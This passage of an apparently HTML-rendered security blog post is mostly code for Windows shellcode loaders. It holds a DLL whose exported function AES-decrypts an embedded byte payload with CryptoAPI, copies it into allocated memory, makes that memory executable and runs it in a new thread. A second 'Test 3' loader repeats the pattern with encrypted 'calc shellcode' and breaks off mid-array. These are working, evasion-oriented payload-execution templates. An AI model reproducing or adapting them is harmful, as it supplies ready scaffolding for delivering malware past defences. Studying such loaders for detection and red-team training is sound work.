class="mh">0x92</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xa3</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span> <span class="p">};</span>

<span class="k">extern</span> <span class="s">"C"</span><span class="p">{</span> 
<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
        
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
					<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
					<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Test 3:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
</span>

<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
        
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// calc shellcode (exitThread) - 64-bit</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span 